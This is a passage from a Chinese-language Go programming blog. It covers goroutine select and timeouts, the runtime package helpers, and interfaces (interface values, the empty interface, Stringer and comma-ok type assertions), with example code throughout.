<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">fibonacci</span><span class="params">(c, quit <span class="keyword">chan</span> <span class="type">int</span>)</span></span> &#123;</span><br><span class="line">    x, y := <span class="number">1</span>, <span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> &#123;</span><br><span class="line">        <span class="keyword">select</span> &#123;</span><br><span class="line">        <span class="keyword">case</span> c &lt;- x:</span><br><span class="line">            x, y = y, x + y</span><br><span class="line">        <span class="keyword">case</span> &lt;-quit:</span><br><span class="line">            fmt.Println(<span class="string">&quot;quit&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    c := <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="type">int</span>)</span><br><span class="line">    quit := <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="type">int</span>)</span><br><span class="line">    <span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line">        <span class="keyword">for</span> i := <span class="number">0</span>; i &lt; <span class="number">10</span>; i++ &#123;</span><br><span class="line">            fmt.Println(&lt;-c)</span><br><span class="line">        &#125;</span><br><span class="line">        quit &lt;- <span class="number">0</span></span><br><span class="line">    &#125;()</span><br><span class="line">    fibonacci(c, quit)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="超时"><a href="#超时" class="headerlink" title="超时"></a>超时</h2><p>有时候会出现 goroutine 阻塞的情况，那么我们如何避免整个程序进入阻塞的情况呢？我们可以利用 select 来设置超时，通过如下的方式实现：</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    c := <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="type">int</span>)</span><br><span class="line">    o := <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="type">bool</span>)</span><br><span class="line">    <span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line">        <span class="keyword">for</span> &#123;</span><br><span class="line">            <span class="keyword">select</span> &#123;</span><br><span class="line">                <span class="keyword">case</span> v := &lt;- c:</span><br><span class="line">                    <span class="built_in">println</span>(v)</span><br><span class="line">                <span class="keyword">case</span> &lt;- time.After(<span class="number">5</span> * time.Second):</span><br><span class="line">                    <span class="built_in">println</span>(<span class="string">&quot;timeout&quot;</span>)</span><br><span class="line">                    o &lt;- <span class="literal">true</span></span><br><span class="line">                    <span class="comment">// 此处的break只是跳出了select循环，并未终止for循环，要用return才能终止这个子进程</span></span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;()</span><br><span class="line">    &lt;- o</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="runtime-goroutine"><a href="#runtime-goroutine" class="headerlink" title="runtime goroutine"></a>runtime goroutine</h2><p>runtime 包中有几个处理 goroutine 的函数：</p>
<p>Goexit</p>
<p>退出当前执行的 goroutine，但是 defer 函数还会继续调用</p>
<p>Gosched</p>
<p>让出当前 goroutine 的执行权限，调度器安排其他等待的任务运行，并在下次某个时候从该位置恢复执行。</p>
<p>NumCPU</p>
<p>返回 CPU 核数量</p>
<p>NumGoroutine</p>
<p>返回正在执行和排队的任务总数</p>
<p>GOMAXPROCS</p>
<p>用来设置可以并行计算的 CPU 核数的最大值，并返回之前的值。</p>
<p>转载文章：<a target="_blank" rel="noopener" href="https://learnku.com/docs/build-web-application-with-golang/027-concurrency/3165#577813">02.7. 并发 | 第二章. Go 语言基础 |《Go Web 编程》| Go 技术论坛 (learnku.com)</a></p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://2324152038.github.io/2022/09/16/4.interface/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="https://chunquchunlai.oss-cn-chengdu.aliyuncs.com/3705DE5E0A790DFCC780E4AD61EFC4A6.jpg">
      <meta itemprop="name" content="春去春来">
      <meta itemprop="description" content="登峰造极境">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="RISE">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/09/16/4.interface/" class="post-title-link" itemprop="url">4.interface</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>
              

              <time title="创建时间：2022-09-16 08:38:31 / 修改时间：09:01:05" itemprop="dateCreated datePublished" datetime="2022-09-16T08:38:31+08:00">2022-09-16</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Go-web-%E7%BC%96%E7%A8%8B/" itemprop="url" rel="index"><span itemprop="name">Go web 编程</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="interface"><a href="#interface" class="headerlink" title="interface"></a>interface</h1><p>Go 语言里面设计最精妙的应该算 interface，它让面向对象，内容组织实现非常的方便，当你看完这一章，你就会被 interface 的巧妙设计所折服。</p>
<h2 id="什么是-interface"><a href="#什么是-interface" class="headerlink" title="什么是 interface"></a>什么是 interface</h2><p>简单的说，interface 是一组 method 签名的组合，我们通过 interface 来定义对象的一组行为。</p>
<p>我们前面一章最后一个例子中 Student 和 Employee 都能 SayHi，虽然他们的内部实现不一样，但是那不重要，重要的是他们都能 say hi</p>
<p>让我们来继续做更多的扩展，Student 和 Employee 实现另一个方法 Sing，然后 Student 实现方法 BorrowMoney 而 Employee 实现 SpendSalary。</p>
<p>这样 Student 实现了三个方法：SayHi、Sing、BorrowMoney；而 Employee 实现了 SayHi、Sing、SpendSalary。</p>
<p>上面这些方法的组合称为 interface (被对象 Student 和 Employee 实现)。例如 Student 和 Employee 都实现了 interface：SayHi 和 Sing，也就是这两个对象是该 interface 类型。而 Employee 没有实现这个 interface：SayHi、Sing 和 BorrowMoney，因为 Employee 没有实现 BorrowMoney 这个方法。</p>
<h2 id="interface-类型"><a href="#interface-类型" class="headerlink" title="interface 类型"></a>interface 类型</h2><p>interface 类型定义了一组方法，如果某个对象实现了某个接口的所有方法，则此对象就实现了此接口。详细的语法参考下面这个例子</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> Human <span class="keyword">struct</span> &#123;</span><br><span class="line">    name <span class="type">string</span></span><br><span class="line">    age <span class="type">int</span></span><br><span class="line">    phone <span class="type">string</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> Student <span class="keyword">struct</span> &#123;</span><br><span class="line">    Human <span class="comment">// 匿名字段 Human</span></span><br><span class="line">    school <span class="type">string</span></span><br><span class="line">    loan <span class="type">float32</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> Employee <span class="keyword">struct</span> &#123;</span><br><span class="line">    Human <span class="comment">// 匿名字段 Human</span></span><br><span class="line">    company <span class="type">string</span></span><br><span class="line">    money <span class="type">float32</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Human 对象实现 Sayhi 方法</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(h *Human)</span></span> SayHi() &#123;</span><br><span class="line">    fmt.Printf(<span class="string">&quot;Hi, I am %s you can call me on %s\n&quot;</span>, h.name, h.phone)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Human 对象实现 Sing 方法</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(h *Human)</span></span> Sing(lyrics <span class="type">string</span>) &#123;</span><br><span class="line">    fmt.Println(<span class="string">&quot;La la, la la la, la la la la la...&quot;</span>, lyrics)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Human 对象实现 Guzzle 方法</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(h *Human)</span></span> Guzzle(beerStein <span class="type">string</span>) &#123;</span><br><span class="line">    fmt.Println(<span class="string">&quot;Guzzle Guzzle Guzzle...&quot;</span>, beerStein)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Employee 重载 Human 的 Sayhi 方法</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(e *Employee)</span></span> SayHi() &#123;</span><br><span class="line">    fmt.Printf(<span class="string">&quot;Hi, I am %s, I work at %s. Call me on %s\n&quot;</span>, e.name,</span><br><span class="line">        e.company, e.phone) <span class="comment">// 此句可以分成多行</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Student 实现 BorrowMoney 方法</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(s *Student)</span></span> BorrowMoney(amount <span class="type">float32</span>) &#123;</span><br><span class="line">    s.loan += amount <span class="comment">// (again and again and...)</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Employee 实现 SpendSalary 方法</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(e *Employee)</span></span> SpendSalary(amount <span class="type">float32</span>) &#123;</span><br><span class="line">    e.money -= amount <span class="comment">// More vodka please!!! Get me through the day!</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 定义 interface</span></span><br><span class="line"><span class="keyword">type</span> Men <span class="keyword">interface</span> &#123;</span><br><span class="line">    SayHi()</span><br><span class="line">    Sing(lyrics <span class="type">string</span>)</span><br><span class="line">    Guzzle(beerStein <span class="type">string</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> YoungChap <span class="keyword">interface</span> &#123;</span><br><span class="line">    SayHi()</span><br><span class="line">    Sing(song <span class="type">string</span>)</span><br><span class="line">    BorrowMoney(amount <span class="type">float32</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> ElderlyGent <span class="keyword">interface</span> &#123;</span><br><span class="line">    SayHi()</span><br><span class="line">    Sing(song <span class="type">string</span>)</span><br><span class="line">    SpendSalary(amount <span class="type">float32</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>通过上面的代码我们可以知道，interface 可以被任意的对象实现。我们看到上面的 Men interface 被 Human、Student 和 Employee 实现。同理，一个对象可以实现任意多个 interface，例如上面的 Student 实现了 Men 和 YoungChap 两个 interface。</p>
<p>最后，任意的类型都实现了空 interface (我们这样定义：interface {})，也就是包含 0 个 method 的 interface。</p>
<h2 id="interface-值"><a href="#interface-值" class="headerlink" title="interface 值"></a>interface 值</h2><p>那么 interface 里面到底能存什么值呢？如果我们定义了一个 interface 的变量，那么这个变量里面可以存实现这个 interface 的任意类型的对象。例如上面例子中，我们定义了一个 Men interface 类型的变量 m，那么 m 里面可以存 Human、Student 或者 Employee 值。</p>
<p>因为 m 能够持有这三种类型的对象，所以我们可以定义一个包含 Men 类型元素的 slice，这个 slice 可以被赋予实现了 Men 接口的任意结构的对象，这个和我们传统意义上面的 slice 有所不同。</p>
<p>让我们来看一下下面这个例子:</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> Human <span class="keyword">struct</span> &#123;</span><br><span class="line">    name <span class="type">string</span></span><br><span class="line">    age <span class="type">int</span></span><br><span class="line">    phone <span class="type">string</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> Student <span class="keyword">struct</span> &#123;</span><br><span class="line">    Human <span class="comment">// 匿名字段</span></span><br><span class="line">    school <span class="type">string</span></span><br><span class="line">    loan <span class="type">float32</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> Employee <span class="keyword">struct</span> &#123;</span><br><span class="line">    Human <span class="comment">// 匿名字段</span></span><br><span class="line">    company <span class="type">string</span></span><br><span class="line">    money <span class="type">float32</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Human 实现 SayHi 方法</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(h Human)</span></span> SayHi() &#123;</span><br><span class="line">    fmt.Printf(<span class="string">&quot;Hi, I am %s you can call me on %s\n&quot;</span>, h.name, h.phone)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Human 实现 Sing 方法</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(h Human)</span></span> Sing(lyrics <span class="type">string</span>) &#123;</span><br><span class="line">    fmt.Println(<span class="string">&quot;La la la la...&quot;</span>, lyrics)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Employee 重载 Human 的 SayHi 方法</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(e Employee)</span></span> SayHi() &#123;</span><br><span class="line">    fmt.Printf(<span class="string">&quot;Hi, I am %s, I work at %s. Call me on %s\n&quot;</span>, e.name,</span><br><span class="line">        e.company, e.phone)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Interface Men 被 Human, Student 和 Employee 实现</span></span><br><span class="line"><span class="comment">// 因为这三个类型都实现了这两个方法</span></span><br><span class="line"><span class="keyword">type</span> Men <span class="keyword">interface</span> &#123;</span><br><span class="line">    SayHi()</span><br><span class="line">    Sing(lyrics <span class="type">string</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    mike := Student&#123;Human&#123;<span class="string">&quot;Mike&quot;</span>, <span class="number">25</span>, <span class="string">&quot;222-222-XXX&quot;</span>&#125;, <span class="string">&quot;MIT&quot;</span>, <span class="number">0.00</span>&#125;</span><br><span class="line">    paul := Student&#123;Human&#123;<span class="string">&quot;Paul&quot;</span>, <span class="number">26</span>, <span class="string">&quot;111-222-XXX&quot;</span>&#125;, <span class="string">&quot;Harvard&quot;</span>, <span class="number">100</span>&#125;</span><br><span class="line">    sam := Employee&#123;Human&#123;<span class="string">&quot;Sam&quot;</span>, <span class="number">36</span>, <span class="string">&quot;444-222-XXX&quot;</span>&#125;, <span class="string">&quot;Golang Inc.&quot;</span>, <span class="number">1000</span>&#125;</span><br><span class="line">    tom := Employee&#123;Human&#123;<span class="string">&quot;Tom&quot;</span>, <span class="number">37</span>, <span class="string">&quot;222-444-XXX&quot;</span>&#125;, <span class="string">&quot;Things Ltd.&quot;</span>, <span class="number">5000</span>&#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 定义 Men 类型的变量i</span></span><br><span class="line">    <span class="keyword">var</span> i Men</span><br><span class="line"></span><br><span class="line">    <span class="comment">// i 能存储 Student</span></span><br><span class="line">    i = mike</span><br><span class="line">    fmt.Println(<span class="string">&quot;This is Mike, a Student:&quot;</span>)</span><br><span class="line">    i.SayHi()</span><br><span class="line">    i.Sing(<span class="string">&quot;November rain&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment">// i 也能存储 Employee</span></span><br><span class="line">    i = tom</span><br><span class="line">    fmt.Println(<span class="string">&quot;This is tom, an Employee:&quot;</span>)</span><br><span class="line">    i.SayHi()</span><br><span class="line">    i.Sing(<span class="string">&quot;Born to be wild&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 定义了 slice Men</span></span><br><span class="line">    fmt.Println(<span class="string">&quot;Let&#x27;s use a slice of Men and see what happens&quot;</span>)</span><br><span class="line">    x := <span class="built_in">make</span>([]Men, <span class="number">3</span>)</span><br><span class="line">    <span class="comment">// 这三个都是不同类型的元素，但是他们实现了 interface 同一个接口</span></span><br><span class="line">    x[<span class="number">0</span>], x[<span class="number">1</span>], x[<span class="number">2</span>] = paul, sam, mike</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> _, value := <span class="keyword">range</span> x&#123;</span><br><span class="line">        value.SayHi()</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>通过上面的代码，你会发现 interface 就是一组抽象方法的集合，它必须由其他非 interface 类型实现，而不能自我实现， Go 通过 interface 实现了 duck-typing: 即 “当看到一只鸟走起来像鸭子、游泳起来像鸭子、叫起来也像鸭子，那么这只鸟就可以被称为鸭子”。</p>
<h2 id="空-interface"><a href="#空-interface" class="headerlink" title="空 interface"></a>空 interface</h2><p>空 interface (interface {}) 不包含任何的 method，正因为如此，所有的类型都实现了空 interface。空 interface 对于描述起不到任何的作用 (因为它不包含任何的 method），但是空 interface 在我们需要存储任意类型的数值的时候相当有用，因为它可以存储任意类型的数值。它有点类似于 C 语言的 void* 类型。</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 定义 a 为空接口</span></span><br><span class="line"><span class="keyword">var</span> a <span class="keyword">interface</span>&#123;&#125;</span><br><span class="line"><span class="keyword">var</span> i <span class="type">int</span> = <span class="number">5</span></span><br><span class="line">s := <span class="string">&quot;Hello world&quot;</span></span><br><span class="line"><span class="comment">// a 可以存储任意类型的数值</span></span><br><span class="line">a = i</span><br><span class="line">a = s</span><br></pre></td></tr></table></figure>

<p>一个函数把 interface {} 作为参数，那么他可以接受任意类型的值作为参数，如果一个函数返回 interface {}, 那么也就可以返回任意类型的值。是不是很有用啊！</p>
<h2 id="interface-函数参数"><a href="#interface-函数参数" class="headerlink" title="interface 函数参数"></a>interface 函数参数</h2><p>interface 的变量可以持有任意实现该 interface 类型的对象，这给我们编写函数 (包括 method) 提供了一些额外的思考，我们是不是可以通过定义 interface 参数，让函数接受各种类型的参数。</p>
<p>举个例子：fmt.Println 是我们常用的一个函数，但是你是否注意到它可以接受任意类型的数据。打开 fmt 的源码文件，你会看到这样一个定义:</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> Stringer <span class="keyword">interface</span> &#123;</span><br><span class="line">     String() <span class="type">string</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>也就是说，任何实现了 String 方法的类型都能作为参数被 fmt.Println 调用，让我们来试一试</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">    <span class="string">&quot;fmt&quot;</span></span><br><span class="line">    <span class="string">&quot;strconv&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> Human <span class="keyword">struct</span> &#123;</span><br><span class="line">    name <span class="type">string</span></span><br><span class="line">    age <span class="type">int</span></span><br><span class="line">    phone <span class="type">string</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 通过这个方法 Human 实现了 fmt.Stringer</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(h Human)</span></span> String() <span class="type">string</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;❰&quot;</span>+h.name+<span class="string">&quot; - &quot;</span>+strconv.Itoa(h.age)+<span class="string">&quot; years -  ✆ &quot;</span> +h.phone+<span class="string">&quot;❱&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    Bob := Human&#123;<span class="string">&quot;Bob&quot;</span>, <span class="number">39</span>, <span class="string">&quot;000-7777-XXX&quot;</span>&#125;</span><br><span class="line">    fmt.Println(<span class="string">&quot;This Human is : &quot;</span>, Bob)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="interface-变量存储的类型"><a href="#interface-变量存储的类型" class="headerlink" title="interface 变量存储的类型"></a>interface 变量存储的类型</h2><p>我们知道 interface 的变量里面可以存储任意类型的数值 (该类型实现了 interface)。那么我们怎么反向知道这个变量里面实际保存了的是哪个类型的对象呢？目前常用的有两种方法：</p>
<p>Comma-ok 断言</p>
<p>Go 语言里面有一个语法，可以直接判断是否是该类型的变量： value, ok &#x3D; element.(T)，这里 value 就是变量的值，ok 是一个 bool 类型，element 是 interface 变量，T 是断言的类型。</p>
<p>如果 element 里面确实存储了 T 类型的数值，那么 ok 返回 true，否则返回 false。</p>
<p>让我们通过一个例子来更加深入的理解。</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">    <span class="string">&quot;fmt&quot;</span></span><br><span class="line">    <span class="string">&quot;strconv&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> Element <span class="keyword">interface</span>&#123;&#125;</span><br><span class="line"><span class="keyword">type</span> List [] Element</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> Person <span class="keyword">struct</span> &#123;</span><br><span class="line">    name <span class="type">string</span></span><br><span class="line">    age <span class="type">int</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 定义了 String 方法，实现了 fmt.Stringer</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(p Person)</span></span> String() <span class="type">string</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;(name: &quot;</span> + p.name + <span class="string">&quot; - age: &quot;</span>+strconv.Itoa(p.age)+ <span class="string">&quot; years)&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    list := <span class="built_in">make</span>(List, <span class="number">3</span>)</span><br><span class="line">    list[<span class="number">0</span>] = <span class="number">1</span> <span class="comment">// an int</span></span><br><span class="line">    list[<span class="number">1</span>] = <span class="string">&quot;Hello&quot;</span> <span class="comment">// a string</span></span><br><span class="line">    list[<span class="number">2</span>] = Person&#123;<span class="string">&quot;Dennis&quot;</span>, <span class="number">70</span>&#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> index, element := <span class="keyword">range</span> list &#123;</span><br><span class="line">        <span class="keyword">if</span> value, ok := element.(<span class="type">int</span>); ok &#123;</span><br><span class="line">            fmt.Printf(<span class="string">&quot;list[%d] is an int and its value is %d\n&quot;</span>, index, value)</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> value, ok := element.(<span class="type">string</span>); ok &#123;</span><br><span class="line">            fmt.Printf(<span class="string">&quot;list[%d] is a string and its value is %s\n&quot;</span>, index, value)</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> value, ok := element.(Person); ok &#123;</span><br><span class="line">            fmt.Printf(<span class="string">&quot;list[%d] is a Person and its value is %s\n&quot;</span>, index, value)</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            fmt.Printf(<span 